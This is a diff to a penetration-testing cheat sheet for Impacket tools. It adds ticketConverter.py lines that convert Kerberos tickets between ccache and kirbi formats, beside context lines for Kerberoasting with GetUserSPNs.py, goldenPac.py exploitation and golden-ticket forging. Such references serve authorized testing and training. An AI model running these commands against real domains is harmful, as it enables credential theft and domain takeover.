@@ -32,6 +32,18 @@ GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
 goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>
 ```
 
+## Ticketer - tickets UNIX to Win
+
+```
+ticketConverter.py <ticket.ccache> <ticket.kirbi>
+```
+
+## Ticketer - tickets Win to Unix
+
+```
+ticketConverter.py <ticket.kirbi> <ticket.ccache>
+```
+
 ## Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
